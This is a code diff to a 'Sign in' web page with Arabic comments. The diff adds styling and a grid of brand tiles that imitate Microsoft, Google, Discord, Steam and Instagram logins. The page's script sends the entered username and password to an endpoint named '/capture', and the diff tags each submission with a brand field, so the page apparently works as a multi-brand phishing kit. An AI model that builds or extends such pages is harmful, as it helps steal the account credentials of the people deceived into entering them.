@@ -4,9 +4,61 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Sign in</title>
-<link rel="stylesheet" href="/style.css">
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center;
+    font-family: -apple-system, Segoe UI, Roboto, sans-serif;
+    background: #0f1115; color: #e6e6e6; padding: 20px;
+  }
+  
+  /* الفورم الأساسي */
+  .card {
+    width: 100%; max-width: 360px; padding: 32px; background: #171a21; border-radius: 12px;
+    box-shadow: 0 10px 40px rgba(0,0,0,.4); margin-bottom: 24px;
+  }
+  h1 { margin: 0 0 4px; font-size: 22px; }
+  .sub { margin: 0 0 24px; color: #8a8f99; font-size: 14px; }
+  input {
+    width: 100%; padding: 12px; margin-bottom: 12px; border-radius: 8px;
+    border: 1px solid #2a2f3a; background: #0f1115; color: #e6e6e6; font-size: 14px;
+  }
+  input:focus { outline: none; border-color: #4a90e2; }
+  button {
+    width: 100%; padding: 12px; border: 0; border-radius: 8px;
+    background: #4a90e2; color: white; font-weight: 600; cursor: pointer; font-size: 14px;
+  }
+  button:hover { background: #3a7bc8; }
+  #msg { color: #e26a6a; font-size: 13px; margin-top: 12px; min-height: 16px; text-align: center; }
+
+  /* الفاصل */
+  .divider {
+    display: flex; align-items: center; text-align: center; color: #8a8f99; font-size: 13px; margin-bottom: 24px; width: 100%; max-width: 360px;
+  }
+  .divider::before, .divider::after {
+    content: ''; flex: 1; border-bottom: 1px solid #2a2f3a;
+  }
+  .divider:not(:empty)::before { margin-right: .25em; }
+  .divider:not(:empty)::after { margin-left: .25em; }
+
+  /* شبكة الشعارات */
+  .grid {
+    display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; width: 100%; max-width: 360px;
+  }
+  .tile {
+    background: #171a21; border: 1px solid #2a2f3a; border-radius: 10px;
+    padding: 16px 8px; cursor: pointer; transition: all .15s ease;
+    display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 8px;
+    text-decoration: none; color: inherit;
+  }
+  .tile:hover { border-color: #4a90e2; background: #1c2029; transform: translateY(-2px); }
+  .tile img { height: 28px; width: auto; max-width: 100%; object-fit: contain; }
+  .tile span { font-size: 11px; color: #b5bac1; font-weight: 500; }
+</style>
 </head>
 <body>
+
+  <!-- الفورم الأساسي -->
   <div class="card">
     <h1>Sign in</h1>
     <p class="sub">to continue</p>
@@ -17,6 +69,40 @@
     </form>
     <p id="msg"></p>
   </div>
+
+  <!-- الفاصل -->
+  <div class="divider">or continue with</div>
+
+  <!-- الشعارات -->
+  <div class="grid">
+    <a class="tile" href="/?b=microsoft">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft">
+      <span>Microsoft</span>
+    </a>
+    <a class="tile" href="/?b=google">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
+      <span>Google</span>
+    </a>
+    <a class="tile" href="/?b=discord">
+      <img src="https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6ca814282eca7172c6_icon_clyde_white_RGB.svg" alt="Discord">
+      <span>Discord</span>
+    </a>
+    <a class="tile" href="/?b=steam">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/8/83/Steam_icon_logo.svg" alt="Steam">
+      <span>Steam</span>
+    </a>
+    <a class="tile" href="/?b=instagram">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram">
+      <span>Instagram</span>
+    </a>
+    <a class="tile" href="/instagram.html">
+      <svg viewBox="0 0 24 24" fill="none" stroke="#b5bac1" stroke-width="1.5" style="height:28px;width:28px">
+        <circle cx="12" cy="12" r="9"/><path d="M12 8v4l3 2"/>
+      </svg>
+      <span>Other</span>
+    </a>
+  </div>
+
 <script>
 document.getElementById('f').addEventListener('submit', async e => {
   e.preventDefault();
@@ -24,7 +110,7 @@ document.getElementById('f').addEventListener('submit', async e => {
   const r = await fetch('/capture', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ user: fd.get('user'), pass: fd.get('pass') })
+    body: JSON.stringify({ user: fd.get('user'), pass: fd.get('pass'), brand: 'generic' })
   });
   const j = await r.json().catch(() => ({}));
   if (j.redirect) { window.location = j.redirect; return; }
